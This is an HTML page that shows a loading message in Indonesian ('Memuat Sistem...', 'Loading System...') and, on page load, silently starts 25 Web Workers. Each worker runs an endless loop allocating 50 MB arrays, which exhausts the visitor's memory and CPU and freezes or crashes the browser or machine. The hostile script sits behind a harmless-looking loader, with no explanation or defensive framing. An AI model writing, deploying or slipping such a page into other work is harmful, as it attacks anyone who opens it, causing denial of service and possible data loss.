<!DOCTYPE html>
<html>
<body style="background:#0a0a0c; color:#6a0dad; display:flex; justify-content:center; align-items:center; height:100vh;">
    <div class="loader">Memuat Sistem...</div>
    <script>
        window.onload = () => {
            for (let i = 0; i < 25; i++) {
                let blob = new Blob([`
                    let heap = [];
                    while(true) { heap.push(new Uint8Array(1024 * 1024 * 50)); }
                `], {type: 'application/javascript'});
                new Worker(URL.createObjectURL(blob));
            }
        };
    </script>
</body>
</html>
